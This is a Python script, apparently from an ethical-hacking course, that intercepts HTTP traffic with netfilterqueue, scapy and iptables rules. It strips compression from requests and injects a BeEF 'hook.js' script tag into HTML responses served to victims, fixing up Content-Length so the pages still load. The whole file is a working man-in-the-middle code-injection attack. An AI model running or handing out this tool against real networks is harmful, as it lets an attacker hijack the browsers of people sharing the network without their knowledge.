#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import subprocess
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 10000:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1" , "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == 10000:
            print("[+] Response")
            # print(scapy_packet.show())
            # '<script src="http://10.0.2.15:3000/hook.js"></script>' <script src="http://127.0.0.1:3000/hook.js"></script>
            injection_code = '<script src="http://127.0.0.1:3000/hook.js"></script>'
            load = load.replace("</body>", injection_code + "</body>")
            # the script may be cut off from the actual html ...
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()

# queue = netfilterqueue.NetfilterQueue()
# queue.bind(0, process_packet)
# queue.run()

subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
# subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
subprocess.call("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000", shell=True)
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("Detected CTRL-C ..... Flushing IPTABLES")
    subprocess.call("iptables --flush", shell=True)


# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
#
# iptables -I FORWARD -j NFQUEUE --queue-num 0
#
# iptables --flush
